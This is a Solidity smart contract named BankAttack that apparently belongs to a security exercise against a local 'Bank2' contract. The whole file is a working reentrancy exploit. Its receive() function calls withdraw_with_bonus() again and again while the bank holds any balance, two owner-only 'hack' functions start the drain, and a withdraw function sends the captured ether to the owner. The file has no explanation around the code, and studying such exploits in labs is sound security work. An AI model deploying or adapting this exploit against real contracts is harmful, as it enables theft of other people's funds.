// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '@openzeppelin/contracts/access/Ownable.sol';
import 'hardhat/console.sol';
import './Bank2.sol';

contract BankAttack is Ownable {
    Bank2 public bank;

    constructor(address payable bank_) {
        bank = Bank2(bank_);
    }

    receive() external payable {
        if (address(bank).balance > 0) {
            bank.withdraw_with_bonus();
        }
    }

    function withdraw() external onlyOwner {
        payable(owner()).transfer(address(this).balance);
    }

    function hack1() external payable onlyOwner {
        (bool success, ) = address(bank).call{value: msg.value, gas: 10000000 }("");
        if (!success) {
            revert();
        }
    }

    function hack2() external payable onlyOwner {
        bank.giveBonusToUser{value: msg.value}(address(this));
        bank.withdraw_with_bonus();
    }
}